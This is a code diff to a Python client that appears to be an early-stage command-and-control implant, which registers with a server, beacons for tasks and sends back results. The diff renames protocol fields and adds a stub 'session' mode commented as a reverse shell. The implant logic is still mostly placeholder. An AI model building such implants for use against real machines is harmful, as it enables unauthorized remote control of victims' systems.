@@ -15,10 +15,10 @@ agent.connect((HOST, PORT))
 def register():
     register = """
     {
-        "type": "register",
+        "mode": "register",
         "agent_id": null,
         "hostname": "kali",
-        "mac": "xx-xx-yy-xx",
+        "mac": "xx-xx-yyx-xx",
         "os": "windows"
     }
     """
@@ -45,8 +45,8 @@ def register():
 def beacon():
     beacon = """
     {
-        "type":"beacon",
-        "agent_id":"a245fd660245555d46a77cb58bf1b373174c63661e42ce196b9cb09a7b425482"   
+        "mode":"beacon",
+        "agent_id":"a47505de64adaefc253cd1c27751da77587710e876aac229bc8032edbc8d775b"   
     }
     """
 
@@ -65,17 +65,17 @@ def beacon():
     #p = json.dumps(response, indent=4)
     data = json.loads(response)
 
-    if data["type"] == "nope":
+    if data["mode"] == "none":
         print("There are no tasks")
-    elif data['type'] == "task":
+    elif data['mode'] == "task":
         print("Execute Task")
         task_id = data['task_id']
         task = f"""
         {{
-            "type":"{task_id}",
-            "task_id":"1",
+            "type":"task",
+            "task_id":"{task_id}",
             "agent_id":"a245fd660245555d46a77cb58bf1b373174c63661e42ce196b9cb09a7b425482",
-            "output":"nkateko"
+            "response":"nkateko"
         }}
         """
         print("task id: ", task_id)
@@ -90,7 +90,34 @@ def beacon():
             print("Invalid JSON ❌:", e)
 
         agent.sendall(task.encode())
+    elif data['mode'] == "session":
+        session()
+
+
+def session():
+    # rev shell
+    mode = """
+    {
+        "mode":"session"
+    }
+    """
+
+    try:
+        data = json.loads(mode)
+        print("Valid JSON ✅")
+    except json.JSONDecodeError as e:
+        print("Invalid JSON ❌:", e)
+
+
+
+    #register
+    agent.sendall(mode.encode())    
+    response = agent.recv(4048)
+    print(f"[<] Server responded: {response.decode()}")
+    #p = json.dumps(response, indent=4)
+    data = json.loads(response)    
 
 
 if __name__ == "__main__":
-    beacon()
+    #beacon()
+    register()
